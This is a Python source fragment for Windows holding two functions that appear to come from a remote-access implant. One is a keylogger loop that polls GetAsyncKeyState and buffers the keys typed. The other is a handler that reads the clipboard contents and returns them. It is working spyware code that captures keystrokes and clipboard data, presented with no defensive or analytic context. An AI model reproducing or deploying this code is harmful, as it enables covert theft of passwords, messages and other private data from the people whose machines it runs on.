def _keylog_loop():
    global _kl_running
    user32 = ctypes.WinDLL("user32")
    user32.GetAsyncKeyState.argtypes = [ctypes.c_int]
    user32.GetAsyncKeyState.restype = ctypes.c_short
    prev = [False] * 256
    while _kl_running:
        for vk in range(0x08, 0xFF):
            if 0x01 <= vk <= 0x06: continue
            s = user32.GetAsyncKeyState(vk)
            if (s & 0x8000) and not prev[vk]:
                if 0x41 <= vk <= 0x5A:
                    shift = bool(user32.GetAsyncKeyState(0x10) & 0x8000)
                    _kl_buf.append(chr(vk) if shift else chr(vk+32))
                elif 0x30 <= vk <= 0x39:
                    _kl_buf.append(chr(vk))
                elif vk == 0x0D: _kl_buf.append("\\n")
                elif vk == 0x20: _kl_buf.append(" ")
            prev[vk] = bool(s & 0x8000)
        time.sleep(0.01)

def handle_clipboard(data):
    action = data.decode("utf-8","replace")
    try:
        user32 = ctypes.WinDLL("user32")
        CF = 13  # CF_UNICODETEXT
        if action == "read":
            if not user32.OpenClipboard(None): return b""
            try:
                if not user32.IsClipboardFormatAvailable(CF): return b"(empty)"
                h = user32.GetClipboardData(CF)
                if not h: return b"(empty)"
                p = ctypes.windll.kernel32.GlobalLock(h)
                try: return ctypes.wstring_at(p).encode()
                finally: ctypes.windll.kernel32.GlobalUnlock(h)
            finally: user32.CloseClipboard()
        return b"unknown"
    except Exception as e: return str(e).encode()

